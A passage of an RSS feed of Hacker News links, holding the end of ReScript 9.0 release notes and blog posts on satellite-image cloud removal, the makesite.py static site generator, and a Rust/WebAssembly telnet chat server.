</code></pre></div></div></div><p>The <code>when</code> keyword is deprecated. The syntax will continue supporting it and the formatter will automatically convert to <code>if</code>, for a pain-free upgrade.</p><h3>Cleaner Polyvariant Syntax<span><span><a href="#cleaner-polyvariant-syntax"><svg height="0.8em" width="0.8em" viewBox="0 0 20.003 19.944"><path d="M11.927 7.908a4.819 4.819 0 00-3.968-1.3 5.091 5.091 0 00-2.921 1.508L1.47 11.684a4.82 4.82 0 00.192 7.122 4.994 4.994 0 006.76-.4l3.7-3.776a.109.109 0 00-.067-.184s-.649.029-1.132.006a10.116 10.116 0 01-1.35-.226.308.308 0 00-.243.088l-2.529 2.609a2.733 2.733 0 01-3.583.319 2.64 2.64 0 01-.247-3.951l3.755-3.753a2.7 2.7 0 013.654-.073.108.108 0 00.15 0l1.4-1.4a.114.114 0 00-.003-.157z"></path><path d="M8.076 12.036a4.822 4.822 0 003.967 1.3 5.089 5.089 0 002.922-1.509l3.568-3.568a4.818 4.818 0 00-.192-7.121 5 5 0 00-6.761.4l-3.7 3.777a.108.108 0 00.067.183s.648-.028 1.132-.006a10.151 10.151 0 011.35.226.3.3 0 00.243-.088l2.529-2.608a2.732 2.732 0 013.581-.319 2.638 2.638 0 01.249 3.95l-3.755 3.754a2.706 2.706 0 01-3.654.073.107.107 0 00-.15 0l-1.4 1.4a.113.113 0 00.004.156z"></path></svg></a><a id="cleaner-polyvariant-syntax"></a></span></span></h3><p>Polyvariants with invalid identifier names (e.g. names including hypens <code>-</code>), don't require any special escaping syntax anymore:</p><div><div><div><pre><code><span>type</span> animation <span>=</span> <span>[</span> #<span>"ease-in"</span> | #<span>"ease-out"</span> <span>]</span>
</code></pre></div></div></div><p>We introduced this change to allow easier interop with existing JS string enums. In pure ReScript code, we'd still recommend our users to stick with valid identifier names instead (e.g. <code>easeIn</code> instead of <code>ease-in</code>).</p><h2>Breaking Changes<span><span><a href="#breaking-changes"><svg height="0.8em" width="0.8em" viewBox="0 0 20.003 19.944"><path d="M11.927 7.908a4.819 4.819 0 00-3.968-1.3 5.091 5.091 0 00-2.921 1.508L1.47 11.684a4.82 4.82 0 00.192 7.122 4.994 4.994 0 006.76-.4l3.7-3.776a.109.109 0 00-.067-.184s-.649.029-1.132.006a10.116 10.116 0 01-1.35-.226.308.308 0 00-.243.088l-2.529 2.609a2.733 2.733 0 01-3.583.319 2.64 2.64 0 01-.247-3.951l3.755-3.753a2.7 2.7 0 013.654-.073.108.108 0 00.15 0l1.4-1.4a.114.114 0 00-.003-.157z"></path><path d="M8.076 12.036a4.822 4.822 0 003.967 1.3 5.089 5.089 0 002.922-1.509l3.568-3.568a4.818 4.818 0 00-.192-7.121 5 5 0 00-6.761.4l-3.7 3.777a.108.108 0 00.067.183s.648-.028 1.132-.006a10.151 10.151 0 011.35.226.3.3 0 00.243-.088l2.529-2.608a2.732 2.732 0 013.581-.319 2.638 2.638 0 01.249 3.95l-3.755 3.754a2.706 2.706 0 01-3.654.073.107.107 0 00-.15 0l-1.4 1.4a.113.113 0 00.004.156z"></path></svg></a><a id="breaking-changes"></a></span></span></h2><p>This release comes with a minor breaking change that shouldn't have much impact on the upgrade of existing codebases.</p><h3>Nested Records within Objects<span><span><a href="#nested-records-within-objects"><svg height="0.8em" width="0.8em" viewBox="0 0 20.003 19.944"><path d="M11.927 7.908a4.819 4.819 0 00-3.968-1.3 5.091 5.091 0 00-2.921 1.508L1.47 11.684a4.82 4.82 0 00.192 7.122 4.994 4.994 0 006.76-.4l3.7-3.776a.109.109 0 00-.067-.184s-.649.029-1.132.006a10.116 10.116 0 01-1.35-.226.308.308 0 00-.243.088l-2.529 2.609a2.733 2.733 0 01-3.583.319 2.64 2.64 0 01-.247-3.951l3.755-3.753a2.7 2.7 0 013.654-.073.108.108 0 00.15 0l1.4-1.4a.114.114 0 00-.003-.157z"></path><path d="M8.076 12.036a4.822 4.822 0 003.967 1.3 5.089 5.089 0 002.922-1.509l3.568-3.568a4.818 4.818 0 00-.192-7.121 5 5 0 00-6.761.4l-3.7 3.777a.108.108 0 00.067.183s.648-.028 1.132-.006a10.151 10.151 0 011.35.226.3.3 0 00.243-.088l2.529-2.608a2.732 2.732 0 013.581-.319 2.638 2.638 0 01.249 3.95l-3.755 3.754a2.706 2.706 0 01-3.654.073.107.107 0 00-.15 0l-1.4 1.4a.113.113 0 00.004.156z"></path></svg></a><a id="nested-records-within-objects"></a></span></span></h3><p>Previously, if you wrote <code>{"user": {age: 10}}</code>, the inner record was interpreted as an object instead of a record (<code>{"user": {"age": 10}}</code>); this is a byproduct of some internal interop transformation details; with the ReScript syntax, this went from understandable to confusing, so we're changing it so that the inner record is indeed now treated as a record. This is an obvious fix, but a breaking change if you were accidentally leveraging that nested record as object.</p><p>Here is a code example before and after the change. Note how the <code>user</code> record secretly turns into a ReScipt object in the previous version:</p><div><div><div><pre><code><span>type</span> user <span>=</span> {
  age: int 
}

<span>let</span> data <span>=</span> {
  <span>"user"</span>: {
    age: <span>1</span> 
  }
}


<span>let</span> age <span>=</span> <span>data[<span>"user"</span>]</span>.age
</code></pre></div></div></div><p>More discussions on this change can be found <a href="https://forum.rescript-lang.org/t/fixing-the-semantics-of-nested-objects-breaking-changes/976" rel="noopener noreferrer">here</a>.</p><h2>Closing Note<span><span><a href="#closing-note"><svg height="0.8em" width="0.8em" viewBox="0 0 20.003 19.944"><path d="M11.927 7.908a4.819 4.819 0 00-3.968-1.3 5.091 5.091 0 00-2.921 1.508L1.47 11.684a4.82 4.82 0 00.192 7.122 4.994 4.994 0 006.76-.4l3.7-3.776a.109.109 0 00-.067-.184s-.649.029-1.132.006a10.116 10.116 0 01-1.35-.226.308.308 0 00-.243.088l-2.529 2.609a2.733 2.733 0 01-3.583.319 2.64 2.64 0 01-.247-3.951l3.755-3.753a2.7 2.7 0 013.654-.073.108.108 0 00.15 0l1.4-1.4a.114.114 0 00-.003-.157z"></path><path d="M8.076 12.036a4.822 4.822 0 003.967 1.3 5.089 5.089 0 002.922-1.509l3.568-3.568a4.818 4.818 0 00-.192-7.121 5 5 0 00-6.761.4l-3.7 3.777a.108.108 0 00.067.183s.648-.028 1.132-.006a10.151 10.151 0 011.35.226.3.3 0 00.243-.088l2.529-2.608a2.732 2.732 0 013.581-.319 2.638 2.638 0 01.249 3.95l-3.755 3.754a2.706 2.706 0 01-3.654.073.107.107 0 00-.15 0l-1.4 1.4a.113.113 0 00.004.156z"></path></svg></a><a id="closing-note"></a></span></span></h2><p>We only highlighted a few user-facing features, but there are also some pretty interesting internal changes happening right now.</p><p>For example, we are tinkering with the idea on using WASM to replace Camlp4, and we are also working on a generalized visitor pattern that doesn't require objects.</p><p>We will discuss these topics in a separate development post, but we are already excited about the new possibilities this will bring within the compiler toolchain.</p><p>Happy Hacking!</p></div></div></div>]]>
            </description>
            <link>https://rescript-lang.org/blog/release-9-0</link>
            <guid isPermaLink="false">hacker-news-small-sites-26228682</guid>
            <pubDate>Mon, 22 Feb 2021 18:52:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Machine learnning for cloud removal in satellite images]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26228564">thread link</a>) | @sowmyay
<br/>
February 22, 2021 | https://eng.ruumi.io/post/seeing-through-clouds.html | <a href="https://web.archive.org/web/*/https://eng.ruumi.io/post/seeing-through-clouds.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
        <p>During the 2020 lockdown, I embarked on building machine learning applications using satellite images with the lovely folks from <a href="https://ruumi.io/">ruumi.io</a>.
We worked on machine learning models to look through clouds, in collaboration with <a href="https://github.com/daniel-j-h">daniel-j-h</a>.</p>
<p>We recently presented <a href="https://docs.google.com/presentation/d/1lEIQoCLEv-GUp49OkKa0xu1q3-DXChqQOwjfAru2nd4/edit?usp=sharing">our approach</a> on cloud see-thru at the <a href="https://www.meetup.com/Geo-Berlin/events/275863507/">GeoBerlin</a> meetup, and received a lot of interest and questions.
And so, we decided to write this blog post detailing our methodology, and challenges we faced on the way.</p>
<h2 id="the-challenges-with-using-satellite-images">The Challenges with using Satellite Images<a href="#the-challenges-with-using-satellite-images" arialabel="Anchor">⌗</a> </h2>
<p>At ruumi, we work on rotational grazing: a managed grazing technique to improve biodiversity, replenish the soil, and be profitable for farmers at the same time.
However, many farmers are apprehensive about adopting such regenerative agriculture techniques, as they are labor-intensive and require complex planning.</p>
<p><img src="https://eng.ruumi.io/img/post/0002-rotational-grazing.jpg" alt="Picture showing rotational grazing"></p>
<p>This is where ruumi comes in: we are using multi-spectral and radar satellite images, soil maps, seed mix data, and state-of-the-art remote sensing and machine learning techniques to assist farmers in transitioning to regenerative agriculture.</p>
<p>One of the main challenges in using satellite data for land monitoring applications is cloud obstruction.
These obstructions can be twofold: clouds may block the view of the farmland underneath and their shadows may obscure or distort features on the ground.</p>
<p>Over the last few years, several cloud removal techniques have been developed: <a href="https://eox.at/2017/03/sentinel-2-cloudless/">Sentinel-2 Cloudless</a>, <a href="https://www.wired.com/2013/05/a-cloudless-atlas/">Mapbox Cloudless Atlas</a> and <a href="https://www.theatlantic.com/technology/archive/2016/06/google-maps-gets-a-satellite-makeover-mosaic-700-trillion/488939/">Google’s Cloudless Satellite Map</a>.
These techniques are sifting through multiple years of images to create cloud-free scenes.
This works fine if the goal is to improve the aesthetics of the satellite images, but the trade-off is recency.
In applications like ours, where we rely on the most recent images to monitor changes on the land, these techniques cannot be used.</p>
<p>Since we haven’t found any cloud removal techniques out there that prioritize recency, we set out to develop our own state-of-the-art machine learning model to do just that.
Our goal is not to hallucinate what we can’t see, but instead, to remove those pesky translucent clouds and accurately reconstruct what’s underneath.</p>
<p><img src="https://eng.ruumi.io/img/post/0002-nocloud.gif" alt="Animation showing before and after cloud removal">
<em>Before and after pictures showing our cloud removal technique</em></p>
<h2 id="sentinel-2-constellation">Sentinel-2 Constellation<a href="#sentinel-2-constellation" arialabel="Anchor">⌗</a> </h2>
<p>Over the past decade, the European Space Agency (ESA) has been developing and putting into orbit, a network of satellites called Sentinels.
These satellites carry a range of sensors, such as radar and multi-spectral imaging instruments for land, ocean, and atmospheric monitoring at a global scale.</p>
<p>The Sentinel-2 satellite mission is part of this ongoing effort and is of particular interest to us.
This mission consists of twin satellites flying in the same orbit around the earth, but phased at 180°.
They provide high resolution multi-spectral images with a planet wide coverage, and a revisit frequency of 3-5 days i.e. the satellite sensors revisit the same patch on the earth every 3-5 days.</p>
<p><img src="https://eng.ruumi.io/img/post/0002-sentinel-in-orbit.jpg" alt="Picture showing the Sentinel-2 satellites">
<em>Sentinel 2 satellite, mapping the earth’s surface. Photo by <a href="https://www.esa.int/ESA_Multimedia/Images/2012/02/Sentinel-2">ESA</a></em></p>
<p>The Sentinel-2 satellites carry a multi-spectral instrument (MSI) which works passively, by collecting sunlight reflected from the Earth’s surface.
New data is acquired as the satellite moves along its orbital path.
The incoming light beam is split into 12 spectral bands, in the visible, near infrared and short wave infrared spectral range.
Of these 12 bands, 4 bands are at 10m, 6 bands at 20m and 2 bands at 60m spatial resolution.
Here, spatial resolution refers to the ground area covered by one pixel.
This means that in an image of 10m resolution, each pixel corresponds to a square of 10m x 10m on the ground.</p>
<p>Apart from these 12 spectral bands, Sentinel-2 data also includes a scene classification mask at 60m resolution.
With the help of this band we can easily identify defective pixels, cloud pixels (both thick and thin or cirrus), snow or water pixels, and vegetation and non-vegetation pixels in the image.</p>
<p>For more information on the Sentinel-2 mission, please refer to <a href="https://sentinel.esa.int/web/sentinel/user-guides/sentinel-2-msi">their user guides</a>.</p>
<h2 id="cloud-mask">Cloud Mask<a href="#cloud-mask" arialabel="Anchor">⌗</a> </h2>
<p>Clouds can be broadly classified into two types: dense, and thin or cirrus clouds.</p>
<p>Dense clouds do not allow the penetration of visible spectral radiation from the ground and tend to cast a shadow on the ground.
It is hard to predict the pixel values under these clouds with high confidence as none of the Sentinel-2 spectral bands are able to penetrate through them.</p>
<p>Thin or cirrus clouds on the other hand are transparent or semi-transparent clouds.
Most spectral bands can partially see through these clouds. This is key to accurate de-clouding with our model.</p>
<p>The scene classification mask provided in Sentinel-2 data is able to classify cloud pixels and cloud shadows in the image.
It is also able to distinguish between thick and cirrus clouds, as described <a href="https://sentinel.esa.int/web/sentinel/technical-guides/sentinel-2-msi/level-2a/algorithm">here</a>.</p>
<p><strong>Our aim is to reconstruct pixels classified as cirrus clouds and cloud shadows, while guaranteeing image recency and accuracy.</strong></p>
<h2 id="our-approach">Our Approach<a href="#our-approach" arialabel="Anchor">⌗</a> </h2>
<p>Our main contribution is to create a training dataset based on (cloud, no-cloud) pairs for the same geography but from different days.
The machine learning model then learns to re-construct the no-cloud sample from the cloud sample.</p>
<p>The basic assumption is that between cloud and no-cloud scenes only cloud pixels will change.
This simple approach worked very well for us.</p>
<p>Inspired by the paper <a href="https://arxiv.org/abs/1804.07723">Image inpainting for irregular holes using partial convolutions</a>, we developed a machine learning model that can reconstruct pixels that are otherwise distorted by the semi-transparent clouds and cloud shadows.
We pass image data from the 12 multi-spectral bands, and the cloud mask extracted from the scene classification mask to our model.
Our model, referred to as SensrUnet, works by extracting relevant information from the multi-spectral image data and reconstructing a de-clouded image from the information.</p>
<p>To prepare our training dataset, we began by downloading Sentinel-2 tiles from the past two years over the geographical region of Germany.
There are multiple Sentinel-2 tiles covering Germany and we use all tiles to build a dataset to train our model.</p>
<p><img src="https://eng.ruumi.io/img/post/0002-tile-cover-germany.jpg" alt="Picture showing the Sentinel-2 tiles overlayed on a map of Germany">
<em>Sentinel tile cover over Germany</em></p>
<p>The spatial resolutions of the multi-spectral bands varied between 10m, 20m and 60m resolution.
To stack all the bands together, so that it can be passed to the model as a single input unit, bands have to be scaled to the same resolution.
Scaling bands from lower resolution to a higher resolution, inadvertently results in introducing blurriness.
To keep this to a minimum and since most of the bands were in the 20m and 60m spatial resolution, we chose to scale all the bands to 20m resolution.</p>
<p><img src="https://eng.ruumi.io/img/post/0002-image-chunking.jpg" alt="Picture showing how to chunk an image into smaller parts">
<em>Cutting out smaller images from the spectral band stacks</em></p>
<p>We stacked all the 12 resampled spectral bands, and the cloud mask generated from the scene classification mask.
Next we cut out smaller images of size 256x256x13 from these spectral band stacks and constructed (cloud, no-cloud) image pairs.</p>
<p>To assure recency between the cloud and no-cloud images, we constrained the time difference between these images to be at most two weeks.</p>
<h2 id="network-architecture">Network Architecture<a href="#network-architecture" arialabel="Anchor">⌗</a> </h2>
<p>SensrUNet is an improved UNet architecture with a pre-trained encoder following the approach from the <a href="https://arxiv.org/abs/1801.05746">TernausNet paper</a>.
The decoder blocks perform pixel shuffle up-scaling with <a href="https://arxiv.org/abs/1609.05158">ICNR initialization</a> to avoid any artifacts in the up-scaled image.</p>
<p>We also added <a href="https://arxiv.org/abs/1904.11492">global context attention blocks</a> after each encoder and decoder layer.
These attention blocks enable the model to reconstruct different parts of the image effectively as they retain a global context of the image.
We observed significant improvements in output image quality with the attention blocks, while the number of parameters increased only by a small percentage of 1.6%.</p>
<p><img src="https://eng.ruumi.io/img/post/0002-model-arch.jpg" alt="Picture showing a Unet’ish model architecture">
<em>SensrUnet: model architecture</em></p>
<h3 id="loss-function-and-model">Loss Function and Model<a href="#loss-function-and-model" arialabel="Anchor">⌗</a> </h3>
<p>Our training dataset consists of (cloud, no-cloud) pairs.
We pass the cloudy image (with 13 multi-spectral bands) to our model, and it outputs a de-clouded image, which we compare to the no-cloud image (target image).</p>
<p>Since we don’t want the model to strongly replicate the pixel values in the target image, we focus on loss computation only on pixels where thin or cirrus clouds are present.
We uniquely designed our loss function to be a combination of pixel loss, perceptual, texture losses and total variation loss, similar to the loss function used in <a href="https://arxiv.org/pdf/1804.07723.pdf">this paper</a>.</p>
<p>The perceptual and texture losses allow for minor fluctuations between the output and target, while capturing the similarity in style and the features of the two images.
After all, these are satellite images of two different days and minor variations in the input and target images are expected.</p>
<p>The total variation loss, acts as a smoothing penalty on the composite image.
Collectively, these loss functions ensure smooth reconstruction of the image under thin or cirrus cloud pixels.</p>
<div><pre><code data-lang="python">composite <span>=</span> cloud_mask <span>*</span> out <span>+</span> (<span>1</span> <span>-</span> cloud_mask) <span>*</span> target                                                                       

loss <span>=</span> a <span>*</span> PixelwiseLoss(cloud_mask <span>*</span> out, cloud_mask <span>*</span> target)
     <span>+</span> b <span>*</span> PerceptualLoss(composite, target)
     <span>+</span> c <span>*</span> TextureLoss(composite, target)
     <span>+</span> d <span>*</span> VariationLoss(composite)
</code></pre></div><p><em>Weighted combination of individual loss-terms</em></p>
<p>We trained the model for 48 hours on our workstation with 2x NVIDIA RTX 2080 TIs.</p>
<p>During inference, we ensure that we modify only pixels where thin or cirrus clouds are present and copy the other pixel values as is from the input image.
The reason for this is, that we don’t want to introduce prediction uncertainty in pixels where there were no clouds present, and leave those pixels untouched.</p>
<p><img src="https://eng.ruumi.io/img/post/0002-nocloud.gif" alt="Picture showing before and after cloud removal">
<em>Before and after pictures showing our cloud removal technique</em></p>
<h2 id="future-work">Future Work<a href="#future-work" arialabel="Anchor">⌗</a> </h2>
<p>We set out to develop a state-of-the art machine learning model that can de-cloud satellite images while prioritizing image recency.
Using SensrUnet, and the scene classification mask, we are able to successfully see through thin or cirrus clouds.</p>
<p>However, we found that the scene classification mask …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://eng.ruumi.io/post/seeing-through-clouds.html">https://eng.ruumi.io/post/seeing-through-clouds.html</a></em></p>]]>
            </description>
            <link>https://eng.ruumi.io/post/seeing-through-clouds.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26228564</guid>
            <pubDate>Mon, 22 Feb 2021 18:45:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Makesite.py]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26228172">thread link</a>) | @susam
<br/>
February 22, 2021 | https://www.swilliams.io/w/using-makesite-py/ | <a href="https://web.archive.org/web/*/https://www.swilliams.io/w/using-makesite-py/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article">
            <article id="article">
                
<em>2021-01-12</em>
<p>I think every software developer, or even everyone entirely, should have a personal website. They are great opportunities to learn new technologies, get your
    writing online to where people can see it, and give back to the online community no doubt you rely on.</p>
<p>I've had a personal website for a few years now and I've been using a static site that's been manually maintained and curated, which hasn't been ideal as
    I've had to spend an equal amount of time in boring upkeep as I did actually producing content. So, I'm rather pleased to have recently found <a href="https://github.com/sunainapai/makesite">makesite.py</a> - an elegant, lightweight, and friendly little tool to generate static
    websites.</p>
<p>The primary design philoshopy behind makesite.py is its simplicity. The entire engine behind it is a single 250 line Python file which is easy for the even
    beginner programmers to understand. This engine uses templates you've made and combines them dynamically with content and data you've written, compiling it
    into a static website ready to be hosted. Running the code takes less than a second so the results are immediate, and so it fits nicely into my current
    workflow using VS Code.</p>
<p>Before now, I was manually maintaining the website's headers, page meta tags, RSS feed, etc. Now, I barely even have to think about that stuff and I'm more
    freed to write content without managing quite so much of the chores.</p>
<p>There are of course other static site generators out there: <a href="https://github.com/jekyll/jekyll">Jekyll</a>, <a href="https://github.com/getpelican/pelican">Pelican</a>, and <a href="https://github.com/gohugoio/hugo">Hugo</a> to name a few. But I think most
    struggle to come close to the simplicity of <a href="https://github.com/sunainapai/makesite">makesite.py</a>. I recommend makesite.py to anyone who's
    looking for a static site generator that is as simple as possible or anyone willing to dig a little into the code to really get a bespoke solution.</p>

            </article>
        </div></div>]]>
            </description>
            <link>https://www.swilliams.io/w/using-makesite-py/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26228172</guid>
            <pubDate>Mon, 22 Feb 2021 18:23:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I built a telnet chat server in 2021 with WebAssembly]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26227970">thread link</a>) | @todsacerdoti
<br/>
February 22, 2021 | https://lunatic.solutions/blog/lunatic-chat/ | <a href="https://web.archive.org/web/*/https://lunatic.solutions/blog/lunatic-chat/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody"><p><span>
      <a href="https://lunatic.solutions/static/39135b82cc936f07e9a4f3a555d03383/8963a/terminal.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Terminal screenshot" title="Terminal screenshot" src="https://lunatic.solutions/static/39135b82cc936f07e9a4f3a555d03383/f058b/terminal.png" srcset="https://lunatic.solutions/static/39135b82cc936f07e9a4f3a555d03383/c26ae/terminal.png 158w,
https://lunatic.solutions/static/39135b82cc936f07e9a4f3a555d03383/6bdcf/terminal.png 315w,
https://lunatic.solutions/static/39135b82cc936f07e9a4f3a555d03383/f058b/terminal.png 630w,
https://lunatic.solutions/static/39135b82cc936f07e9a4f3a555d03383/40601/terminal.png 945w,
https://lunatic.solutions/static/39135b82cc936f07e9a4f3a555d03383/78612/terminal.png 1260w,
https://lunatic.solutions/static/39135b82cc936f07e9a4f3a555d03383/8963a/terminal.png 1918w" sizes="(max-width: 630px) 100vw, 630px" loading="lazy">
  </a>
    </span></p>
<p>I love the aesthetics of terminals and I’m not the only one, there is a whole
<a href="https://www.reddit.com/r/unixporn/">subreddit</a> dedicated to people sharing their desktops and
showcasing different terminal setups. Last year I spent working on
<a href="https://github.com/lunatic-solutions/lunatic">an innovative WebAssembly runtime called Lunatic</a>.
Recently we landed TCP support and I was super excited to start building real world applications
with it, and what would be a better fit than a terminal based chat server with a
<a href="https://thenewstack.io/the-lost-worlds-of-telnet/">retro vibe</a>?</p>
<p>It took me around a week to build it with Rust +
<a href="https://github.com/lunatic-solutions/lunatic">Lunatic</a> and you can check out the code
<a href="https://github.com/lunatic-solutions/chat">here</a>. If you would like to try it out you
can connect to it with:</p>
<div data-language="bash"><pre><code>
<span>&gt;</span> telnet lunatic.chat

<span>&gt;</span> telnet eu.lunatic.chat</code></pre></div>
<p>While writing the server I ran into many interesting problems and would like to share here how I
leveraged the power of Lunatic to overcome them.</p>
<h2>Architecture</h2>
<p>The reason I picked telnet is that the <a href="https://tools.ietf.org/html/rfc854">specification</a> is
simple enough to read through and implement in a short time. It’s a small layer on top of TCP and
as mentioned before we had TCP already working. On the other hand, telnet is a really limiting
protocol and I needed to get creative while building a chat application on top of it.</p>
<p>The first issue I encountered was the line based nature of terminals. You write a command, hit
enter and the terminal prints out some text. This doesn’t go well with the UI of a chat app where
messages can come in at any time. What are you supposed to do when new text arrives and the user
has already partially written her own message? Override the user’s input? Print the new message
after the input?</p>
<p>One solution would be to buffer all messages until the user hits enter and then just dump all
the ones that arrived in the meantime at once, but this can’t work as we would rely on the user
to keep hitting enter to read new messages.</p>
<p>It became clear that I needed to use some kind of terminal user interface where I render
separately all the incoming messages from the user who is currently typing. It’s possible to do
this by using <a href="https://tools.ietf.org/html/rfc1073">a few</a> <a href="https://tools.ietf.org/html/rfc1184">extensions</a>
to the telnet protocol. Once the telnet client connects I send it the following instructions:</p>
<ol>
<li>Don’t echo anything that the user is typing, let me be in charge of printing in the terminal.</li>
<li>Don’t buffer messages, send each keystroke to the server.</li>
<li>Report size changes of the terminal.</li>
</ol>
<p>This allows me to construct the UI on the server and just send a sequence of terminal escape
characters back to bring the user’s terminal up to date. On each keystroke or message received
the UI is updated.</p>
<h3>Massive concurrency</h3>
<p>For this to work we need to permanently keep the telnet connection open and periodically send
data through it. This is a perfect use case for Lunatic’s Processes, they are designed for massive
concurrency. Each client’s connection is handled in a separate Process.</p>
<p>Not to be confused with Operating System processes, Lunatic’s Processes are lightweight and also
known as green threads (but isolated) or <a href="https://golangbot.com/goroutines">go-routines</a> in other
runtimes. They are fast to create, have a small memory footprint and a low scheduling overhead.
All Processes are preemptively scheduled and they can’t spend too much time running without
yielding and giving others a fair share of the resources. This keeps all connections responsive
in an environment where most of the time is spent waiting on I/O.</p>
<h3>Interop with existing libraries</h3>
<p>Luckily I could make use of existing Rust libraries and didn’t need to reinvent the wheel. I used:</p>
<ol>
<li><a href="https://github.com/djc/askama">Askma</a> as a templating engine.</li>
<li><a href="https://github.com/fdehau/tui-rs">TUI</a> as the rendering engine.</li>
<li><a href="https://github.com/chronotope/chrono">Chrono</a> for date formatting.</li>
</ol>
<p>They all compiled to WebAssembly without issues. I just needed to provide a telnet backend for TUI,
but I could reuse most of the code from the <a href="https://github.com/redox-os/termion">termion</a> crate
(sadly it has no Windows support for now).</p>
<p>TUI works in a somewhat similar way to React.js, you update your state and just call a render method.
It will re-render the UI and send back to the client the minimal amount of changes in the form of
terminal escape characters.</p>
<h3>State Management</h3>
<p>A big part of programming is state management. Your application getting into a state that you
couldn’t predict while writing the code is a big source of bugs, and Lunatic tries to simplify
this by allowing you to isolate the state into separate processes.</p>
<p><span>
      <a href="https://lunatic.solutions/static/0e5c431d6d9ea83a50f7f5c79d3db764/636d3/processes.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Processes visualization" title="Processes visualization" src="https://lunatic.solutions/static/0e5c431d6d9ea83a50f7f5c79d3db764/f058b/processes.png" srcset="https://lunatic.solutions/static/0e5c431d6d9ea83a50f7f5c79d3db764/c26ae/processes.png 158w,
https://lunatic.solutions/static/0e5c431d6d9ea83a50f7f5c79d3db764/6bdcf/processes.png 315w,
https://lunatic.solutions/static/0e5c431d6d9ea83a50f7f5c79d3db764/f058b/processes.png 630w,
https://lunatic.solutions/static/0e5c431d6d9ea83a50f7f5c79d3db764/40601/processes.png 945w,
https://lunatic.solutions/static/0e5c431d6d9ea83a50f7f5c79d3db764/636d3/processes.png 1222w" sizes="(max-width: 630px) 100vw, 630px" loading="lazy">
  </a>
    </span></p>
<p>From the perspective of a process, it owns the whole memory and can’t influence the memory of
other processes in any way, not even by unsafe pointer dereferencing. This is a result of building
them on top of WebAssembly instances. The only way processes can talk between each other is through
message passing.</p>
<p>This greatly simplifies reasoning about state changes. You only need to think about what state you
are in and how the next message will influence the state change. It makes it a lot easier to debug
once you find yourself in an undesirable state. Let’s look at a concrete code sample from the
implementation:</p>
<div data-language="rust"><pre><code>


<span>pub</span> <span>fn</span> <span>server_process</span><span>(</span>state_receiver<span>:</span> <span>Receiver</span><span>&lt;</span><span>ServerMessage</span><span>&gt;</span><span>)</span> <span>{</span>
    <span>let</span> <span>mut</span> state <span>=</span> <span>ServerState</span> <span>{</span>
        clients<span>:</span> <span>0</span><span>,</span>
        channels<span>:</span> <span>HashMap</span><span>::</span><span>new</span><span>(</span><span>)</span><span>,</span>
    <span>}</span><span>;</span>

    <span>let</span> <span>mut</span> username_generator<span>:</span> <span>i64</span> <span>=</span> <span>0</span><span>;</span>
    <span>let</span> <span>mut</span> all_usernames <span>=</span> <span>HashSet</span><span>::</span><span>new</span><span>(</span><span>)</span><span>;</span>

    <span>loop</span> <span>{</span>
        <span>match</span> state_receiver<span>.</span><span>receive</span><span>(</span><span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span> <span>{</span>
            <span>ServerMessage</span><span>::</span><span>Joined</span><span>(</span>client<span>)</span> <span>=&gt;</span> <span>{</span>
                
                state<span>.</span>clients <span>+=</span> <span>1</span><span>;</span>
                
                username_generator <span>+=</span> <span>1</span><span>;</span>
                <span>let</span> username <span>=</span> <span>format!</span><span>(</span><span>"User_{}"</span><span>,</span>
                                   username_generator<span>)</span><span>;</span>
                all_usernames<span>.</span><span>insert</span><span>(</span>username<span>.</span><span>clone</span><span>(</span><span>)</span><span>)</span><span>;</span>
                
                <span>let</span> server_info <span>=</span> <span>ServerInfo</span> <span>{</span>
                    clients<span>:</span> state<span>.</span>clients<span>,</span>
                    username<span>,</span>
                <span>}</span><span>;</span>
                <span>let</span> _ <span>=</span> client<span>.</span><span>send</span><span>(</span>server_info<span>)</span><span>;</span>
            <span>}</span>
            <span>ServerMessage</span><span>::</span><span>List</span><span>(</span>client<span>)</span> <span>=&gt;</span> <span>{</span>
                …<span>.</span>
            <span>}</span>
            <span>ServerMessage</span><span>::</span><span>ChangeName</span><span>(</span>from<span>,</span> to<span>,</span> client<span>)</span> <span>=&gt;</span> <span>{</span>
                <span>if</span> all_usernames<span>.</span><span>contains</span><span>(</span><span>&amp;</span>to<span>)</span> <span>{</span>
                    
                    <span>let</span> _ <span>=</span> client<span>.</span><span>send</span><span>(</span><span>false</span><span>)</span><span>;</span>
                <span>}</span> <span>else</span> <span>{</span>
                    all_usernames<span>.</span><span>remove</span><span>(</span><span>&amp;</span>from<span>)</span><span>;</span>
                    all_usernames<span>.</span><span>insert</span><span>(</span>to<span>)</span><span>;</span>
                    <span>let</span> _ <span>=</span> client<span>.</span><span>send</span><span>(</span><span>true</span><span>)</span><span>;</span>
                <span>}</span>
            <span>}</span>
            <span>...</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p>We can see that the process has a few local variables to keep track of its state:</p>
<ul>
<li><em>How many clients are connected.</em></li>
<li><em>Which channels are available.</em></li>
<li><em>If a new user joins what username should be assigned.</em></li>
<li><em>Which usernames are taken.</em></li>
</ul>
<p>Afterwards the Process just runs in a loop waiting on messages. If a new client is connected the
server receives a <code>ServerMessage::Joined</code> message. It will then update the total count of users,
assign a new username to the client and send back a message notifying the client about the assigned
username.</p>
<p>The client’s process is similarly structured, it keeps a state of the current input box for each
channel and all received messages for the channels. The client’s process can receive 2 types of
messages:</p>
<ul>
<li><em>Keystrokes coming from the telnet connection.</em></li>
<li><em>New chat messages coming from all subscribed channels.</em></li>
</ul>
<p>For each keystroke we update the current channel’s input box or attach the new message to the
history of messages in the channel.</p>
<p>If we have such an architecture and run into a bug, let’s say the number of connected users shown
